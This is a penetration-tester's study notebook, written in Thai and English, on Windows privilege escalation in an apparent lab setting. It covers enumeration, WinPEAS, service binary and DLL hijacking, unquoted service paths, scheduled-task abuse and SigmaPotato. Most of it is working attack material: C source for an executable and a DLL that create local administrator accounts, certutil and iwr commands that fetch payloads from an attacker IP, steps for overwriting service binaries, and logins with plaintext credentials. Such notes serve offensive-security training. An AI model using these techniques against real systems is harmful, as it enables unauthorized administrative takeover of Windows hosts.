[[mimikatz]]

```
git clone https://github.com/gentilkiwi/mimikatz.git

```

# Windows Privilege Escalation 

```powershell
# Level 1 Win Priv Manual 

whoami 
# ตรวจสอบ Privilege ของ User ที่ใช้
whoami /priv
whoami /group

# ตรวจสอบ Localgroup ภายในเครื่องเป้าหมาย
net localgroup

# ตรวจสอบ Users ภายใน Groups Remote Management Users 
net localgroup "Remote Management Users"

# เข้าใช้งาน Powershell ภายใต้ Commandline Interface 
powershell -ep bypass

# ตรวจสอบสิทธิ admin 
Get-LocalGroupMember administrators

# ตรวจสอบรายละเอียด Application ที่ติดตั้งบน Computer
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" 
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"

# ตรวจสอบเฉพาะชื่อแอพที่ติดตั้ง
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# ตรวจสอบ Process บนเครื่องเป้าหมาย 
powershell -ep bypass 
Get-Process

# ตรวจสอบรายละเอียดของ Process ชื่อ NonStandardProcess
Get-Process -Name "NonStandardProcess"| format-list *


# ค้นหาไฟล์ตาม File type ที่สนใจ
Get-ChildItem -Path C:\XAMPP -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue 

# คำสั่ง su หรือ Switch Users บน Windows 
runas /user:backupadmin cmd
# แล้วจะมีให้ใส่ password
Enter the password for backupadmin:
Attempting to start cmd as user "CLIENTWK220\backupadmin" 


# คำสั่งตรวจสอบ Powershell command History 
Get-History
(Get-PSReadlineOption).HistorySavePath



```

[[WinEventlogSearching]]
การตรวจสอบ Event ภายใต้ Windows สามารถใช้ Event Viewer ในการตรวจสอบที่ PATH: Application and service Logs > Microsoft > Windows > PowerShell > Operation   Script Block logging event in windows is 4104 

![[EventID4104.png]]

![[EVENTID4104-2.png]]


[[evil-winrm]]
```
# Command บน Kali สำหรับ Powershell ไปยัง Windows 
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```


Level 2 Automate tools 

```bash
# ติดตั้ง WinPeas
sudo apt install peass 
updatedb 
locate winpeas
/usr/bin/winpeas
/usr/share/peass/winpeas
/usr/share/peass/winpeas/winPEAS.bat
/usr/share/peass/winpeas/winPEASany.exe
/usr/share/peass/winpeas/winPEASany_ofs.exe
/usr/share/peass/winpeas/winPEASx64.exe
/usr/share/peass/winpeas/winPEASx64_ofs.exe
/usr/share/peass/winpeas/winPEASx86.exe
/usr/share/peass/winpeas/winPEASx86_ofs.exe

python3 -m http.server 80
certutil.exe -urlcache -split -f http://192.168.45.168/winPEASx64.exe winPEASx64.exe
.\winPEASx64.exe


# Seatbelt Repo 
https://github.com/GhostPack/Seatbelt
# Download Binaries file@
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git

python3 -m http.server 80 
certutil.exe -urlcache -split -f http://192.168.45.241/Seatbelt.exe Seatbelt.exe  
.\Searbelt.exe -group=all 

```


Level 3: Hack Windows Service 

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

|Mask|Permissions|
|---|---|
|F|Full access|
|M|Modify access|
|RX|Read and execute access|
|R|Read-only access|
|W|Write-only access|

# ตรวจสอบสิทธิของ httpd.exe หรือ App ที่สนใจว่า user ที่เราใช้มีสิทธิอะไรบนไฟล์หรือ Service ดังกล่าว โดขให้มองหาสิทธิที่เป็น Full หรือ RX 
icacls "C:\xampp\apache\bin\httpd.exe"
icacls "C:\xampp\mysql\bin\mysqld.exe"
C:\xampp\mysql\bin\mysqld.exe BUILTIN\Administrators:(F)
                              NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Users:(F)

```

จากตัวอย่างจะเห็นว่า Buildin\Users: มีสิทธิ Full Access ฉะนั้นเราสามารถทำ [[Win Service Binary Hijacking]] ได้ 

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

จากนั้น ก็นำโปรแกรมไป Compire บน Kali 

```
# Compile adduser.c > .exe 
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe 

# download adduser.exe
certutil.exe -urlcache -split -f http://192.168.45.241/adduser.exe adduser.exe

# Backup ไฟล์ mysqld.exe กรณีพัง 
PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe C:\xampp\mysql\bin\mysqld2.exe.bkk       
move C:\xampp\mysql\bin\mysqld.exe C:\xampp\mysql\bin\mysqld2.exe.bkk

# เขียนทับ mysqld.exe ด้วย adduser.exe 
PS C:\Users\dave> copy adduser.exe C:\xampp\mysql\bin\mysqld.exe 
copy adduser.exe C:\xampp\mysql\bin\mysqld.exe 

# Restart เพื่อให้รัน Service
PS C:\Users\dave> shutdown /r /t 0 

Get-LocalGroupMember administrators

evil-winrm -i 192.168.222.220 -u dave2 -p 'password123!'

```

[[PowerUp.ps1]]

```
locate PowerUp
/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 . 

certutil.exe -urlcache -split -f http://192.168.45.241/PowerUp.ps1 PowerUp.ps1

# จำเป็นต้องรันทุกครั้งก่อนรัน PowerUp
powershell -ep bypass
. .\PowerUp.ps1

# หลังจากติดตั้ง PowerUp เราสามารถตรวจสอบหา Service ที่สามารถแก้ไขได้และสามารถ upload adduser.exe ไปแทนได้ นั่นเอง
Get-ModifiableServiceFile 

```

![[Powerup-1.png]]![[PowerUp-2.png]]


[[WinDLLHijacking]]

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

```
# เตรียม DLL สำหรับ Hijack 
sudo apt update
sudo apt install g++-mingw-w64 

x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll

```

ภายใต้ Procmon เราจะ Filter Service ที่สนใจ ในที่นี้เป็น Filezilla.exe และทำการตรวจหา DLL ที่ขึ้นผลลัพธ์เป็น NAME NOT FOUND 
![[windllinjectwithprocmon.png]]

ช่องโหว่ของ FileZilla version ที่ใช้ มีช่องโหว่บน DLL ดังตัวอย่าง

```
C:\FileZilla\FileZilla FTP Client\TextShaping.dll 
```

```
iwr -uri http://192.168.45.241/dllhij.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
```

สุดท้ายคือเปิด FileZilla ก็จะเห็น dave3 ด้วยคำสั่ง net user 

[[Unquoted Service Paths]]

```powershell
# คำสั่งสำหรับตรวจสอบ Service ที่มีช่องโหว่ Unquoted Service Paths และไม่อยู่ใน Path C:\Windows 

wmic service get name,pathname |  findstr /i /v "C:\Windows\\" 


edgeupdatem                                "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
---------------------------------------------------------------------
# จากผลลัพธ์จะเห็นว่า Service ชื่อ GammaService นั้นมีช่องโหว่ Unquoted Service Path
GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
---------------------------------------------------------------------

# ทดสอบเปิดและปิด Service ดังกล่าว 
Start-Service GammaService
Stop-Service GammaService
Restart-Service GammaService

# จากช่องโหว่ทำให้เกิดผละกระทบที่น่าเป็นไปได้คือ 
# C:\Program.exe
# C:\Program Files\Enterprise.exe
# C:\Program Files\Enterprise Apps\Current.exe
# C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe


```

เราสามารถตรวจสอบสิทธิ์ของแต่ละ Path ที่เป็นช่องโหว่ได้ 
```powershell
PS C:\Users\steve> icacls "C:\"
C:\ BUILTIN\Administrators:(OI)(CI)(F)
    NT AUTHORITY\SYSTEM:(OI)(CI)(F)
    BUILTIN\Users:(OI)(CI)(RX)
    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
    NT AUTHORITY\Authenticated Users:(AD)
    Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)
    
Successfully processed 1 files; Failed processing 0 files
    
PS C:\Users\steve>icacls "C:\Program Files"
C:\Program Files NT SERVICE\TrustedInstaller:(F)
                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)
                 NT AUTHORITY\SYSTEM:(M)
                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
                 BUILTIN\Administrators:(M)
                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
                 BUILTIN\Users:(RX)
                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
                 CREATOR OWNER:(OI)(CI)(IO)(F)

PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
                                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                                 BUILTIN\Administrators:(OI)(CI)(F)
                                 BUILTIN\Users:(OI)(CI)(RX,W) ***************
                                 CREATOR OWNER:(OI)(CI)(IO)(F)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files
```

ให้ลองหา Permission ของ Path ที่มีสิทธิของ Users เป็น W ขึ้นไป จากตัวอย่างจะเห็นว่า Path C:\Program Files\Enterprise Apps\ นั้นมีช่องโหว่สามารถเขียนได้ 

โดยเมื่อพบแล้วเราสามารถนำ Code ที่ไม่ปลอดภัยไปวางใน Path ดังกล่าว คือ 

```powershell
C:\Program Files\Enterprise Apps\. 
```


การโจมตีจะต้องตั้งชื่อ Payload เป็น Current.exe ซึ่งเป็นตัวต่อของ Path ของ Service ดังกล่าว

```powershell
iwr -uri http://192.168.45.168/adduser.exe -Outfile Current.exe
# จากนั้นเปิดปิด Service ที่มีช่องโหว่อีกครั้ง
Start-Service GammaService
Stop-Service GammaService
Restart-Service GammaService

# จะพบว่ามี user deav2 ถูกเพิ่มขึ้นและมีสิทธิ์เป็น Admin

```

--- 
อีกวิธีคือ การใช้งาน PowerUp.ps1 สำหรับ [[Unquoted Service Paths]] 

```powershell

powershell -ep bypass
. .\PowerUp.ps1

Get-UnquotedService
# ตรวจสอบ icacls ในแต่ละ Path จนพบสิทธิที่สามารถดำเนินการเขียนทับได้ 
PS C:\Users\damian\Desktop> icacls.exe  'C:\Enterprise Software\Monitoring Solution'
C:\Enterprise Software\Monitoring Solution CLIENTWK221\damian:(OI)(CI)(RX,W)
                                           BUILTIN\Administrators:(OI)(CI)(F)
                                           NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                                           BUILTIN\Users:(OI)(CI)(RX)

# รันคำสั่ง Write-ServiceBinary 
Write-ServiceBinary -Name 'ReynhSurveillance' -Path "C:\Enterprise Software\Monitoring Solution\Surveillance.exe"

# จากนั้นใช้คำสั่ง Netuser จะเห็น john:Password123!
net user 
```

[[## Scheduled Tasks]]

```powershell
# ตรวจสอบ Tasklist 
schtasks /query /fo LIST /v 
schtasks /query /fo LIST | findstr "TaskName"
schtasks /query /fo LIST /v /tn "\Microsoft\Voice Activation"
```
![[Stask-1.png]]

```powershell
# ตรวจสอบสิทธิ์ของไฟล์ดังกล่าว
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe

# backup ไฟล์ BackendCacheCleanup.exe
move .\BackendCacheCleanup.exe .\BackendCacheCleanup.exe.bak

# upload payload สำหรับ adduser 
iwr -Uri http://192.168.45.168/adduser.exe -Outfile BackendCacheCleanup.exe

# ตรวจสอบโดยใช้คำสั่ง net user จะพบ dave2 
net user 

xfreerdp /v:192.168.160.220 /u:dave2 /p:'password123!' /cert-ignore /dynamic-resolution +clipboard /drive:TEST,/home/kali/    

```

 [[ExploitWinPriv]]
```powershell
whoami /priv 
# ตรวจสอบ version ของ OS และนำไปหาช่องโหว่จากข้อมูลที่ได้ 
systeminfo
```

![[winexploit-0.png]]

![[Winexploit-1.png]]

![[winexploit-2.png]]

---

[[SeImpersonatePrivilege=SigmaPotato]]

```powershell
# Try whoami /priv 
powershell -ep bypass 

C:\Users\dave> whoami /priv
whoami /priv


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeSecurityPrivilege           Manage auditing and security log          Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege***     Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled


wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe

iwr -uri http://192.168.45.168/SigmaPotato.exe -OutFile SigmaPotato.exe

# ตัวอย่างจะทำการสร้าง user: dave4 และมีรหัสผ่าน lab ไปที่ Administrators 
.\SigmaPotato "net user dave4 lab /add"
.\SigmaPotato "net localgroup Administrators dave4 /add"

xfreerdp /v:192.168.160.220 /u:dave4 /p:'lab' /cert-ignore /dynamic-resolution +clipboard /drive:TEST,/home/kali/


iwr -uri http://192.168.45.168/SigmaPotato.exe -OutFile SigmaPotato.exe

```

https://jlajara.gitlab.io/Potatoes_Windows_Privesc